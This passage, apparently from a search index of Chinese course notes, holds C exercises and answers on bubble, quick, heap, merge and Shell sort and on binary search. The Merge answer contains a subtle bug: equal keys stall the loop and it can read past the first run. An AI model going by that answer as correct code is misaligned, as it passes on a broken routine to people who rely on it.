j;\n\n    for (i = 0; i &lt; n - 1; i++) {\n        for (j = 0; j &lt; n - 1 - i; j++) {\n            if (str[j] &gt; str[j + 1]) {\n                temp = str[j];\n                str[j] = str[j + 1];\n                str[j + 1] = temp;\n            }\n        }\n    }\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E6%8E%92%E5%BA%8F/#_17","title":"\u5feb\u901f\u6392\u5e8f\u7684\u5b9e\u73b0","text":"<p>\u8bf7\u7f16\u5199\u7a0b\u5e8f\uff0c\u5b8c\u6210<code>QuickSort</code>\u51fd\u6570\uff0c\u7ed9\u5b9a\u4e00\u4e2a\u6574\u6570\u6570\u7ec4 a \u548c\u6570\u7ec4\u7684\u957f\u5ea6 n\uff0c\u5b9e\u73b0\u5feb\u901f\u6392\u5e8f\u7b97\u6cd5\uff0c\u5e76\u8f93\u51fa\u6392\u5e8f\u540e\u7684\u6570\u7ec4\u3002</p>"},{"location":"DEC/Data-Structure/Alpha-%E6%8E%92%E5%BA%8F/#_18","title":"\u793a\u4f8b\u8f93\u51fa","text":"Text Only<pre><code>13 27 38 49 51 65 76 97\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E6%8E%92%E5%BA%8F/#_19","title":"\u9898\u76ee","text":"C<pre><code>#include&lt;stdio.h&gt;\n\n//\u8bf7\u5b8c\u6210QuickSort\u51fd\u6570\uff0c\u5b9e\u73b0\u5feb\u901f\u6392\u5e8f \nvoid QuickSort(int a[], int start_num,int end_num)\n{ \n    //\u8bf7\u5728\u6b64\u5904\u586b\u5199\u4ee3\u7801 \n\n}\n\nint main(){\n    int a[]={49,38,65,97,76,13,27,51};\n    int n=sizeof(a)/sizeof(a[0]);\n    QuickSort(a,0,n-1);\n    int i;\n    for(i = 0;i &lt; sizeof(a)/sizeof(int);i++)\n        printf(\"%d \",a[i]);\n    return 0;\n} \n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E6%8E%92%E5%BA%8F/#_20","title":"\u7b54\u6848","text":"C<pre><code>// \u4ea4\u6362\u6570\u7ec4\u4e2d\u4e24\u4e2a\u5143\u7d20\u7684\u503c\nvoid swap(int* a, int* b) {\n    int temp = *a;\n    *a = *b;\n    *b = temp;\n}\n\n// \u5feb\u901f\u6392\u5e8f\nvoid QuickSort(int a[], int start_num, int end_num) {\n    if (start_num &gt;= end_num) {\n        // \u5f53\u5b50\u6570\u7ec4\u53ea\u6709\u4e00\u4e2a\u5143\u7d20\u65f6\uff0c\u5df2\u7ecf\u6709\u5e8f\uff0c\u65e0\u9700\u6392\u5e8f\n        return;\n    }\n\n    int pivot = a[start_num]; // \u9009\u62e9\u7b2c\u4e00\u4e2a\u5143\u7d20\u4f5c\u4e3a\u57fa\u51c6\u503c\n    int left = start_num + 1; // \u5de6\u6307\u9488\u4ece\u57fa\u51c6\u503c\u7684\u4e0b\u4e00\u4e2a\u5143\u7d20\u5f00\u59cb\n    int right = end_num;      // \u53f3\u6307\u9488\u4ece\u6570\u7ec4\u672b\u5c3e\u5f00\u59cb\n\n    while (left &lt;= right) {\n        while (left &lt;= right &amp;&amp; a[left] &lt;= pivot) // \u5728\u5de6\u4fa7\u627e\u5230\u7b2c\u4e00\u4e2a\u5927\u4e8e\u57fa\u51c6\u503c\u7684\u5143\u7d20\n            left++;\n        while (left &lt;= right &amp;&amp; a[right] &gt;= pivot) // \u5728\u53f3\u4fa7\u627e\u5230\u7b2c\u4e00\u4e2a\u5c0f\u4e8e\u57fa\u51c6\u503c\u7684\u5143\u7d20\n            right--;\n\n        if (left &lt; right) // \u5982\u679c\u5de6\u53f3\u6307\u9488\u6ca1\u6709\u76f8\u9047\uff0c\u5219\u4ea4\u6362\u4e24\u4e2a\u5143\u7d20\n            swap(&amp;a[left], &amp;a[right]);\n    }\n\n    swap(&amp;a[start_num], &amp;a[right]); // \u5c06\u57fa\u51c6\u503c\u653e\u5230\u6b63\u786e\u7684\u4f4d\u7f6e\u4e0a\n\n    QuickSort(a, start_num, right - 1); // \u9012\u5f52\u6392\u5e8f\u5de6\u4fa7\u5b50\u6570\u7ec4\n    QuickSort(a, right + 1, end_num);   // \u9012\u5f52\u6392\u5e8f\u53f3\u4fa7\u5b50\u6570\u7ec4\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E6%8E%92%E5%BA%8F/#_21","title":"\u6807\u51c6\u7b54\u6848\uff08\u4e0d\u592a\u597d\uff09","text":"C<pre><code>void QuickSort(int a[], int start_num, int end_num)\n{\n    int i, j, tmp;\n\n    if (start_num &lt; end_num)\n    {\n        i = start_num;\n        j = end_num + 1;\n        while (1)\n        {\n            do {\n                i++;\n            } while (!(a[start_num] &lt;= a[i] || i == end_num));\n\n            do {\n                j--;\n            } while (!(a[start_num] &gt;= a[j] || j == start_num));\n\n            if (i &lt; j) {\n                tmp = a[i];\n                a[i] = a[j];\n                a[j] = tmp;\n            }\n            else {\n                break;\n            }\n        }\n\n        tmp = a[start_num];\n        a[start_num] = a[j];\n        a[j] = tmp;\n\n        QuickSort(a, start_num, j - 1);\n        QuickSort(a, j + 1, end_num);\n    }\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E6%8E%92%E5%BA%8F/#_22","title":"\u5806\u6392\u5e8f\u7684\u5b9e\u73b0","text":"<p>\u8bf7\u7f16\u5199\u7a0b\u5e8f\uff0c\u5b8c\u6210<code>HeapAdjust</code>\u51fd\u6570\uff0c\u7ed9\u5b9a\u4e00\u4e2a\u6574\u6570\u6570\u7ec4 a \u548c\u6570\u7ec4\u7684\u957f\u5ea6 n\uff0c\u5b9e\u73b0\u5806\u6392\u5e8f\u7b97\u6cd5\uff0c\u5e76\u8f93\u51fa\u6bcf\u6b21\u5806\u6392\u5e8f\u7684\u7ed3\u679c\u3002</p>"},{"location":"DEC/Data-Structure/Alpha-%E6%8E%92%E5%BA%8F/#_23","title":"\u793a\u4f8b\u8f93\u51fa","text":"Text Only<pre><code>49 38 65 97 76 13 27 51 \n49 38 65 97 76 13 27 51 \n49 97 65 51 76 13 27 38 \n97 76 65 51 49 13 27 38 \n76 51 65 38 49 13 27 97 \n65 51 27 38 49 13 76 97 \n51 49 27 38 13 65 76 97 \n49 38 27 13 51 65 76 97 \n38 13 27 49 51 65 76 97 \n27 13 38 49 51 65 76 97 \n13 27 38 49 51 65 76 97\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E6%8E%92%E5%BA%8F/#_24","title":"\u9898\u76ee","text":"C<pre><code>#include &lt;stdio.h&gt;\n\n//\u8bf7\u5b8c\u6210HeapAdjust\u51fd\u6570\uff0c\u5b9e\u73b0\u5806\u6392\u5e8f\u4e00\u6b21\u7b5b\u9009\u7684\u8fc7\u7a0b\n//\u5df2\u77e5a[s..m]\u4e2d\u9664a[s]\u4e4b\u5916\u5747\u6ee1\u8db3\u5806\u7684\u5b9a\u4e49\uff0c\u901a\u8fc7\u672c\u51fd\u6570\u8c03\u6574\uff0c\u4f7fa[s..m]\u6210\u4e3a\u4e00\u4e2a\u5927\u9876\u5806 \nvoid HeapAdjust(int a[],int s,int m)\n{\n    //\u8bf7\u5728\u6b64\u6b21\u5b8c\u6210\u4ee3\u7801\n\n\n\n}\n\n// \u5bf9\u987a\u5e8f\u8868a\u8fdb\u884c\u5806\u6392\u5e8f \n// n\u4e3a\u987a\u5e8f\u8868\u7684\u957f\u5ea6 \nvoid HeapSort(int a[], int n)\n{\n    int temp, i, j;\n\n    for (i = (n /2) - 1; i &gt;= 0; i--) // \u6784\u5efa\u5927\u9876\u5806\n        // \u6ce8\uff1a\u6570\u7ec4\u4e0b\u6807\u4ece0\u5f00\u59cb\uff0c\u6240\u4ee5i\u5e94\u8be5\u4ecen/2-1\u5f00\u59cb\uff0c\u56e0\u4e3a\u6570\u7ec4\u957f\u5ea6\u4e3an\uff0c\u6240\u4ee5\u6700\u540e\u4e00\u4e2a\u975e\u53f6\u5b50\u8282\u70b9\u7684\u4e0b\u6807\u4e3an/2-1\n    {\n        HeapAdjust(a, i, n - 1);\n\n        for (j = 0; j &lt; 8; j++) {\n            printf(\"%d \", a[j]);  // \u8f93\u51fa\u5806\u6392\u5e8f\u8fc7\u7a0b\n        }\n        printf(\"\\n\");\n    }\n\n    printf(\"\\n\");\n\n    for (i = n - 1; i &gt; 0; i--)\n    {\n        // \u6bcf\u6b21\u5c06\u5806\u9876\u5143\u7d20\u4e0e\u6700\u540e\u4e00\u4e2a\u5143\u7d20\u4ea4\u6362\uff0c\u7136\u540e\u8c03\u6574\u5806\uff0c\u4f7f\u5176\u6210\u4e3a\u5927\u9876\u5806\n        temp = a[0];\n        a[0] = a[i];\n        a[i] = temp;\n\n        HeapAdjust(a, 0, i - 1);  // \u8c03\u6574\u5806\u4ea7\u751f\u65b0\u7684\u5927\u9876\u5806\n\n        for (j = 0; j &lt; 8; j++) {\n            printf(\"%d \", a[j]);\n        }  // \u8f93\u51fa\u6392\u5e8f\u7ed3\u679c\n        printf(\"\\n\");\n    }\n}\n\nint main()\n{\n    int a[]={49,38,65,97,76,13,27,51};\n    int n=sizeof(a)/sizeof(a[0]);\n    HeapSort(a,n);\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E6%8E%92%E5%BA%8F/#_25","title":"\u6807\u51c6\u7b54\u6848","text":"C<pre><code>// \u8bf7\u5b8c\u6210HeapAdjust\u51fd\u6570\uff0c\u5b9e\u73b0\u5806\u6392\u5e8f\u4e00\u6b21\u7b5b\u9009\u7684\u8fc7\u7a0b\n// \u5df2\u77e5 a[s..m] \u4e2d\u9664 a[s] \u4e4b\u5916\u5747\u6ee1\u8db3\u5806\u7684\u5b9a\u4e49\uff0c\u901a\u8fc7\u672c\u51fd\u6570\u8c03\u6574\uff0c\u4f7f a[s..m] \u6210\u4e3a\u4e00\u4e2a\u5927\u9876\u5806 \nvoid HeapAdjust(int a[], int s, int m)\n{\n    int rc, j; // rc\u4e3a\u7236\u8282\u70b9\uff0cj\u4e3a\u5b50\u8282\u70b9\n    rc = a[s]; // \u7236\u8282\u70b9\n\n    for (j = 2 * s + 1; j &lt;= m; j = j * 2 + 1) // \u6ce8\uff1a\u6570\u7ec4\u4e0b\u6807\u4ece0\u5f00\u59cb\uff0c\u6240\u4ee5\u4e24\u4e2a\u5b50\u8282\u70b9\u662f2s+1,2s+2 \n        // \u4e5f\u5c31\u662fj\u4eces\u7684\u5de6\u5b50\u8282\u70b9\u5f00\u59cb\uff0c\u4e00\u76f4\u5230m\uff0c\u6bcf\u6b21\u5faa\u73af\u4e4b\u540e\u5c06 j \u6307\u5411\u81ea\u5df1\u7684\u5de6\u5b50\n    { \n        if (j &lt; m &amp;&amp; a[j] &lt; a[j + 1]) { // \u6bd4\u8f83\u5de6\u53f3\u5b50\u8282\u70b9\uff0c\u627e\u51fa\u8f83\u5927\u7684\u5b50\u8282\u70b9\n            j++; // \u82e5\u53f3\u5b50\u8282\u70b9\u5927\u4e8e\u5de6\uff0c\u5219\u9009\u53d6\u53f3\u5b50\u8282\u70b9\n        }\n\n        if (rc &gt; a[j]) { // \u82e5\u7236\u8282\u70b9\u5927\u4e8e\u5b50\u8282\u70b9\uff0c\u5219\u4e0d\u9700\u8981\u518d\u4ea4\u6362\uff0c\u76f4\u63a5\u9000\u51fa\u5faa\u73af\n            break;\n        }\n\n        a[s] = a[j]; // \u7236\u8282\u70b9\u4e0e\u8f83\u5927\u7684\u5b50\u8282\u70b9\u4ea4\u6362\n        s = j; // \u7ee7\u7eed\u8c03\u6574\u5b50\u8282\u70b9\n    }\n    a[s] = rc; // \u7236\u8282\u70b9\u4e0e\u5176\u5b50\u8282\u70b9\u4ea4\u6362\u5b8c\u540e\uff0c\u5c06\u7236\u8282\u70b9\u653e\u5230\u6b63\u786e\u4f4d\u7f6e\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E6%8E%92%E5%BA%8F/#_26","title":"\u5b9e\u73b0\u5806\u6392\u5e8f\u7b97\u6cd5","text":"<p>\u7f16\u5199\u4e00\u4e2a\u7a0b\u5e8f\uff0c\u5b9e\u73b0\u5806\u6392\u5e8f\u7b97\u6cd5\u3002\u7a0b\u5e8f\u83b7\u53d6\u4e00\u4e2a\u6574\u6570\u6570\u7ec4\uff0c\u4ee5\u53ca\u6570\u7ec4\u7684\u5143\u7d20\u4e2a\u6570\u3002\u5b8c\u5584\u51fd\u6570 Creat_Heap \u548c Heap_Sort \u4f7f\u7528\u5806\u6392\u5e8f\u7b97\u6cd5\u5bf9\u8f93\u5165\u7684\u6574\u6570\u6570\u7ec4\u8fdb\u884c\u5347\u5e8f\u6392\u5e8f\u3002\u6700\u540e\u8f93\u51fa\u6392\u5e8f\u540e\u7684\u6574\u6570\u6570\u7ec4\u3002</p>"},{"location":"DEC/Data-Structure/Alpha-%E6%8E%92%E5%BA%8F/#_27","title":"\u793a\u4f8b","text":"<p>\u8f93\u5165</p> Text Only<pre><code>\u8bf7\u8f93\u5165\u6570\u7ec4\u7684\u5143\u7d20\u4e2a\u6570\uff1a4\n\u8bf7\u8f93\u5165\u6570\u7ec4\u5143\u7d20\uff1a56 23 76 44\n</code></pre> <p>\u8f93\u51fa</p> Text Only<pre><code>\u5806\u6392\u5e8f\u540e\u7684\u7ed3\u679c\u4e3a\uff1a23 44 56 76\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E6%8E%92%E5%BA%8F/#_28","title":"\u9898\u76ee","text":"C<pre><code>#include&lt;stdio.h&gt;\n#define MAX 100\n\nvoid Insert_Array(int array[],int n){\n     //\u8f93\u5165\u6570\u7ec4 \n    int i;\n    for(i=0;i&lt;n;i++){\n        scanf(\"%d\",&amp;array[i]);//\u8f93\u5165\u6570\u636e\u7528\u7a7a\u683c\u5206\u9694\u5f00 \n    }\n}\n\nvoid Print_Array(int array[],int n){\n     //\u8f93\u51fa\u6570\u7ec4\n    int i;\n    for(i=0;i&lt;n;i++){\n        printf(\"%d \",array[i]);\n    }\n}\n\nvoid Creat_Heap(int  array[], int i, int n){\n     //\u6784\u9020\u5806\uff0c\u8c03\u6574\u5143\u7d20\u4f4d\u7f6e \n\n}\n\nvoid Heap_Sort(int array[], int n){\n     //\u5806\u6392\u5e8f \n\n}\n\nint main(){\n     //\u6839\u636e\u9898\u610f\uff0c\u5b8c\u6210\u7a0b\u5e8f \n\n     int n,array[MAX];\n     printf(\"\u8bf7\u8f93\u5165\u6570\u7ec4\u7684\u5143\u7d20\u4e2a\u6570\uff1a\");\n     scanf(\"%d\",&amp;n); \n\n     printf(\"\u8bf7\u8f93\u5165\u6570\u7ec4\u5143\u7d20\uff1a\");\n     Insert_Array(array,n);\n\n     printf(\"\\n\u5806\u6392\u5e8f\u540e\u7684\u7ed3\u679c\u4e3a\uff1a\");\n     Heap_Sort(array,n);\n     Print_Array(array,n);\n     return 0;\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E6%8E%92%E5%BA%8F/#_29","title":"\u6807\u51c6\u7b54\u6848","text":"<p>\u5bf9\u4e8e\u8fd9\u4e2a\u9898\uff0c\u6211\u7684\u5efa\u8bae\u5c31\u662f\u597d\u597d\u770b\u770b\u4e0a\u4e00\u4e2a\u9898\uff0c\u5efa\u8bae\u53bb<code>bilibili</code>\u770b\u770b\u89c6\u9891</p> C<pre><code>void Creat_Heap(int  array[], int i, int n) {\n    int lchild, temp = array[i];\n\n    for (; 2 * i + 1 &lt; n; i = lchild) {\n        lchild = 2 * i + 1; //\u6c42\u5de6\u5b69\u5b50\n\n        if (lchild != n - 1 &amp;&amp; array[lchild + 1] &gt; array[lchild]) {\n            lchild = lchild + 1; //\u5982\u679clchild\u4e0d\u662f\u6700\u540e\u4e00\u4e2a\u5143\u7d20\uff0c\u6bd4\u8f83\u5de6\u53f3\u5b69\u5b50\uff0c\u627e\u6700\u5927 \n        }\n        if (temp &lt; array[lchild]) {\n            array[i] = array[lchild];\n        }\n        else {\n            break;\n        }\n    }\n    array[i] = temp;\n}\n\nvoid Heap_Sort(int array[], int n) {\n    //\u5806\u6392\u5e8f \n    int i, temp;\n\n    for (i = n / 2; i &gt;= 0; --i) //i\u8868\u793a\u6bd4\u8f83\u4f4d\u7f6e\uff0c\u7b2c\u4e00\u4e2a\u4f4d\u7f6e i = n / 2\n        Creat_Heap(array, i, n);\n    for (i = n - 1; i &gt; 0; --i) {\n        temp = array[0];\n        array[0] = array[i];\n        array[i] = temp; //\u5c06\u6700\u5927\u5143\u7d20\uff08\u5806\u9876\uff09\u4e0e\u6700\u540e\u4e00\u4e2a\u5143\u7d20\u4ea4\u6362\n\n        Creat_Heap(array, 0, i); //\u5220\u9664\u6700\u5927\u5143\u7d20\uff0c\u91cd\u65b0\u6784\u9020\u5806 \n    }\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E6%8E%92%E5%BA%8F/#2-","title":"2-\u8def\u5f52\u5e76\u6392\u5e8f\u7b97\u6cd5\u7684\u5b9e\u73b0","text":"<p>\u8bf7\u7f16\u5199\u7a0b\u5e8f\uff0c\u5b8c\u6210<code>Merge</code>\u51fd\u6570\uff0c\u7ed9\u5b9a\u4e00\u4e2a\u6574\u6570\u6570\u7ec4 a \u548c\u6570\u7ec4\u7684\u957f\u5ea6 n\uff0c\u5b9e\u73b0<code>2-\u8def\u5f52\u5e76\u6392\u5e8f</code>\u7b97\u6cd5\uff0c\u5e76\u8f93\u51fa\u6bcf\u6b21\u5f52\u5e76\u6392\u5e8f\u7684\u7ed3\u679c\u3002</p>"},{"location":"DEC/Data-Structure/Alpha-%E6%8E%92%E5%BA%8F/#_30","title":"\u793a\u4f8b\u8f93\u51fa","text":"Text Only<pre><code>38 49 \n38 49 65 97 \n38 49 65 97 \n38 49 65 97 13 76 \n38 49 65 97 13 76 27 51 \n38 49 65 97 13 27 51 76 \n13 27 38 49 51 65 76 97 \n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E6%8E%92%E5%BA%8F/#_31","title":"\u9898\u76ee","text":"C<pre><code>#include&lt;stdio.h&gt;\n\n//\u8bf7\u5b8c\u6210Merge\u51fd\u6570\uff0c\u5b9e\u73b02-\u8def\u5f52\u5e76\u6392\u5e8f\u529f\u80fd \n//\u8be5\u51fd\u6570\u53ef\u5c06\u6709\u5e8f\u7684SR[i..m]\u548cSR[m+1..n]\u5f52\u5e76\u4e3a\u6709\u5e8f\u7684TR[i..n]\nvoid Merge(int SR[],int TR[],int i,int m,int n){ \n    //\u8bf7\u5728\u6b64\u5b8c\u6210\u4ee3\u7801 \n\n}\n\n//\u5c06SR[s..t] \u5f52\u5e76\u6392\u5e8f\u4e3aTR1[s..t] \nvoid MSort(int SR[], int TR1[], int s, int t)\n{\n    int TR2[8];\n    if(s == t) \n        TR1[s] = SR[s];\n    else \n    {\n        int m = (s+t)/2 ;\n        MSort(SR,TR2,s,m) ;\n        MSort(SR,TR2,m+1,t) ;\n        Merge(TR2,TR1,s,m,t) ;\n        int i;\n        for(i = 0; i &lt;=t ;i++)\n            printf(\"%d \",TR1[i]);\n        printf(\"\\n\");\n    }\n}\n\nint main()\n{\n    int a[]={49,38,65,97,76,13,27,51};\n    int n=sizeof(a)/sizeof(a[0]);\n    int b[8];\n    MSort(a,b,0,n-1);\n    return 0 ;\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E6%8E%92%E5%BA%8F/#_32","title":"\u6807\u51c6\u7b54\u6848","text":"<p>\u54b1\u8981\u5b8c\u6210\u7684\u90e8\u5206\u5e76\u4e0d\u96be\uff0c\u5c31\u662f\u5408\u5e76</p> C<pre><code>//\u8bf7\u5b8c\u6210Merge\u51fd\u6570\uff0c\u5b9e\u73b02-\u8def\u5f52\u5e76\u6392\u5e8f\u529f\u80fd \n//\u8be5\u51fd\u6570\u53ef\u5c06\u6709\u5e8f\u7684 SR[i..m] \u548c SR[m+1..n] \u5f52\u5e76\u4e3a\u6709\u5e8f\u7684 TR[i..n]\nvoid Merge(int SR[], int TR[], int i, int m, int n) {\n    //\u8bf7\u5728\u6b64\u5b8c\u6210\u4ee3\u7801 \n    int j = m + 1, k = i;\n\n    // \u5c06SR[i..m] \u548c SR[j..n] \u5f52\u5e76\u4e3aTR[i..n]\n    while ((i &lt;= m) &amp;&amp; (j &lt;= n))\n    {\n        if (SR[i] &lt; SR[j]) {\n            TR[k++] = SR[i];\n            i = i + 1;\n        }\n        if (SR[i] &gt; SR[j]) {\n            TR[k++] = SR[j];\n            j = j + 1;\n        }\n    }\n\n    while (i &lt;= m) {\n        TR[k++] = SR[i++];\n    }\n    while (j &lt;= n) {\n        TR[k++] = SR[j++];\n    }\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E6%8E%92%E5%BA%8F/#_33","title":"\u7f16\u5199\u5e0c\u5c14\u6392\u5e8f\u7b97\u6cd5","text":"<p>\u7f16\u5199\u4e00\u4e2a\u7a0b\u5e8f\uff0c\u5b9e\u73b0\u5e0c\u5c14\u6392\u5e8f\u7b97\u6cd5\u3002\u7a0b\u5e8f\u83b7\u53d6\u4e00\u4e2a\u6574\u6570\u6570\u7ec4\uff0c\u4ee5\u53ca\u6570\u7ec4\u7684\u5143\u7d20\u4e2a\u6570\u3002\u5b8c\u5584\u51fd\u6570 Shell_Sort \u4f7f\u7528\u5e0c\u5c14\u6392\u5e8f\u7b97\u6cd5\u5bf9\u8f93\u5165\u7684\u6574\u6570\u6570\u7ec4\u8fdb\u884c\u5347\u5e8f\u6392\u5e8f\u3002\u6700\u540e\u8f93\u51fa\u6392\u5e8f\u540e\u7684\u6574\u6570\u6570\u7ec4\u3002</p>"},{"location":"DEC/Data-Structure/Alpha-%E6%8E%92%E5%BA%8F/#_34","title":"\u793a\u4f8b","text":"<p>\u8981\u6c42</p> Text Only<pre><code>1\u3001\u589e\u91cf\u7528increment\u8868\u793a\n2\u3001\u589e\u91cf\u7684\u53d6\u6cd5\uff1aincrement=increment/3\u5411\u4e0b\u53d6\u6574+1\n</code></pre> <p>\u8f93\u5165</p> Text Only<pre><code>\u5728\u4e3b\u51fd\u6570\u4e2d\u8bbe\u7f6estr[] = {3,1,7,8,10,6,5,9,12,0};\n</code></pre> <p>\u8f93\u51fa</p> Text Only<pre><code>\u5e0c\u5c14\u6392\u5e8f\u540e\u7684\u5e8f\u5217\u4e3a\uff1a0 1 3 5 6 7 8 9 10 12\n</code></pre> <p></p>"},{"location":"DEC/Data-Structure/Alpha-%E6%8E%92%E5%BA%8F/#_35","title":"\u9898\u76ee","text":"C<pre><code>#include &lt;stdio.h&gt;\n\nvoid Shell_Sort(int *str,int count){\n     //\u5e0c\u5c14\u6392\u5e8f \n\n}\n\nint main(){  \n    //\u6839\u636e\u9898\u610f\uff0c\u5b8c\u6210\u7a0b\u5e8f\n\n     int str[] = {3,1,7,8,10,6,5,9,12,0};\n     Shell_Sort(str, 10);\n     printf(\"\u5e0c\u5c14\u6392\u5e8f\u540e\u7684\u5e8f\u5217\u4e3a\uff1a\"); \n     for (int i = 0; i &lt; 10; i++)\n          printf(\"%d \",str[i]);\n     return 0;\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E6%8E%92%E5%BA%8F/#_36","title":"\u7b54\u6848","text":"C<pre><code>void Shell_Sort(int* str, int count) {\n    // \u5e0c\u5c14\u6392\u5e8f\n    int increment = count / 3 + 1; // \u521d\u59cb\u589e\u91cf\n\n    while (increment &gt; 1) {\n        for (int i = 0; i &lt; count - increment; i++) {\n            if (str[i] &gt; str[i + increment]) { // \u4ea4\u6362\n                int temp = str[i];\n                str[i] = str[i + increment];\n                str[i + increment] = temp;\n            }\n        }\n        increment = increment / 3 + 1; // \u66f4\u65b0\u589e\u91cf\n    }\n\n    // \u6700\u540e\u4e00\u8d9f\u63d2\u5165\u6392\u5e8f\n    for (int i = 1; i &lt; count; i++) {\n        int temp = str[i];\n        int j = i - 1;\n\n        while (j &gt;= 0 &amp;&amp; str[j] &gt; temp) {\n            str[j + 1] = str[j];\n            j--;\n        }\n        str[j + 1] = temp;\n    }\n}\n</code></pre> <p>\u6700\u540e\u4e00\u8d9f\u7684\u63d2\u5165\u6392\u5e8f\uff1a</p> <p></p>"},{"location":"DEC/Data-Structure/Alpha-%E6%8E%92%E5%BA%8F/#_37","title":"\u6807\u51c6\u7b54\u6848\uff08\u4e0d\u592a\u597d\uff09","text":"<p>\u600e\u4e48\u8bf4\u5462\uff0c\u4e0a\u8fb9\u90a3\u4e2a\u7b54\u6848\u66f4\u2026\u89c4\u8303\u2026\u4e00\u4e9b\uff0c\u5c31\u662f\u66f4\u7b26\u5408\u5e0c\u5c14\u6392\u5e8f\u7684\u6807\u51c6\u6d41\u7a0b\u3002</p> C<pre><code>void Shell_Sort(int *str,int count){\n    //\u5e0c\u5c14\u6392\u5e8f \n    int increment = count;//\u8bbe\u7f6e\u589e\u91cf\u521d\u59cb\u503c \n    while(increment &gt; 1){\n         increment = increment / 3 + 1;\n         for(int i = increment; i &lt; count; i++){\n          int key = str[i];\n          int j = i - increment;\n            while(j &gt;= 0 &amp;&amp; str[j] &gt; key){\n          str[j+increment] = str[j];\n                  j = j - increment;\n            }\n            str[j+increment] = key;\n        }\n    }\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E6%9F%A5%E6%89%BE/","title":"Alpha \u67e5\u627e","text":""},{"location":"DEC/Data-Structure/Alpha-%E6%9F%A5%E6%89%BE/#_1","title":"\u4e8c\u5206\u67e5\u627e\u7b97\u6cd5","text":"<p>\u8bf7\u7f16\u5199\u7a0b\u5e8f\uff0c\u5b8c\u6210<code>search</code>\u51fd\u6570\uff0c\u5b9e\u73b0\u4e8c\u5206\u67e5\u627e\u7b97\u6cd5\uff0c\u8be5\u51fd\u6570\u8fd4\u56de\u5173\u952e\u5b57\u5728\u6570\u7ec4\u4e2d\u7684\u4f4d\u7f6e\uff0c\u5982\u679c\u4e0d\u5b58\u5728\u5219\u8fd4\u56de <code>-1</code>\u3002</p>"},{"location":"DEC/Data-Structure/Alpha-%E6%9F%A5%E6%89%BE/#_2","title":"\u793a\u4f8b\u8f93\u51fa","text":"Text Only<pre><code>9\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E6%9F%A5%E6%89%BE/#_3","title":"\u9898\u76ee","text":"C<pre><code>//\u6709\u5e8f\u8868\u7684\u6298\u534a\u67e5\u627e \n#include &lt;stdio.h&gt;\n\n//\u8bf7\u5b8c\u6210\u8be5\u51fd\u6570 \n//\u529f\u80fd\uff1a\u5b9e\u73b0\u6709\u5e8f\u8868\u7684\u6298\u534a\u67e5\u627e\u529f\u80fd\n//\u8fd4\u56de\u503c\uff1a\u5982\u679c\u627e\u5230\u8fd4\u56de\u6570\u7ec4\u4e0b\u6807\uff08\u6ce8\u610f\uff1a\u6570\u7ec4\u4e0b\u6807\u4ece0\u5f00\u59cb\uff09\uff0c\u5426\u5219\u8fd4\u56de-1\n//\u53c2\u6570\uff1aa\uff0c\u6709\u5e8f\u6570\u7ec4\n//\u53c2\u6570\uff1an\uff0c\u6709\u5e8f\u6570\u7ec4\u4e2d\u5143\u7d20\u7684\u4e2a\u6570\n//\u53c2\u6570\uff1akey,\u67e5\u627e\u7684\u5173\u952e\u5b57 \nint search(int a[], int n, int key)  \n{\n    //\u8bf7\u5728\u6b64\u5904\u5b8c\u6210\u4ee3\u7801 \n\n\n\n}\n\nint main(){\n    int a[11] = {5,13,19,21,37,56,64,75,80,88,92};\n    int n = 11;\n    int key = 88;\n    int pos = search(a,n,key);\n    printf(\"%d\",pos);\n    return 0;\n} \n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E6%9F%A5%E6%89%BE/#_4","title":"\u6807\u51c6\u7b54\u6848","text":"C<pre><code>int search(int a[], int n, int key)  \n{\n    int low = 0;\n    int high = n-1;\n    int mid;\n    while (low &lt;= high)\n    {\n        mid = (low+high)/2;\n        if (key == a[mid])\n            return mid;\n        else if (key &gt; a[mid])\n            low = mid+1;\n        else\n            high = mid-1;\n    }\n    return -1; \n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E6%9F%A5%E6%89%BE/#_5","title":"\u6298\u534a\u67e5\u627e\u7684\u9012\u5f52\u7b97\u6cd5","text":"<p>\u7f16\u5199\u4e00\u4e2a\u7a0b\u5e8f\uff0c\u5b9e\u73b0\u6298\u534a\u67e5\u627e\u7684\u9012\u5f52\u7b97\u6cd5\u3002\u7a0b\u5e8f\u4ece\u7528\u6237\u83b7\u53d6\u4e00\u4e2a\u6709\u5e8f\u6574\u6570\u6570\u7ec4\u548c\u4e00\u4e2a\u8981\u67e5\u627e\u7684\u6574\u6570\u3002\u5b8c\u5584\u51fd\u6570<code>BinSrch</code>\u4f7f\u7528\u9012\u5f52\u5b9e\u73b0\u6298\u534a\u67e5\u627e\u7b97\u6cd5\uff0c\u67e5\u627e\u8f93\u5165\u6574\u6570\u5728\u6709\u5e8f\u6570\u7ec4\u4e2d\u7684\u4f4d\u7f6e\u3002\u6700\u540e\u8f93\u51fa\u627e\u5230\u7684\u5143\u7d20\u7684\u4e0b\u6807\uff0c\u5982\u679c\u627e\u4e0d\u5230\u5219\u8f93\u51fa -1\u3002</p>"},{"location":"DEC/Data-Structure/Alpha-%E6%9F%A5%E6%89%BE/#1","title":"\u793a\u4f8b 1","text":"<p>\u8f93\u5165</p> Text Only<pre><code>3\n</code></pre> <p>\u8f93\u51fa</p> Text Only<pre><code>2\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E6%9F%A5%E6%89%BE/#2","title":"\u793a\u4f8b 2","text":"<p>\u8f93\u5165</p> Text Only<pre><code>10\n</code></pre> <p>\u8f93\u51fa</p> Text 